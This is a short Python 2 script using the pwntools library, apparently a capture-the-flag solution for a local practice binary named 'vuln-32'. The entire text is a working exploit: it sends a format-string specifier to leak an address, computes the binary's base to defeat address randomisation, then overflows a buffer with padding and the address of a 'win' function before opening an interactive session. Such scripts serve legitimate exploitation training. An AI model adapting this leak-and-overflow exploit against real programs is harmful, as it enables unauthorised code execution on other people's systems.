#!/usr/bin/python2

from pwn import *

p = process('./vuln-32')
binary = ELF('./vuln-32')

p.recvuntil('name?\n')
p.sendline('%3$p')

p.recvuntil('you ')
leak = int(p.recvline(),16)

binary.address = leak - 0x11d5

payload = 'A'*32
payload += p32(binary.sym['win'])

p.recvuntil('message?\n')
p.sendline(payload)
# print(hex(leak))

p.interactive()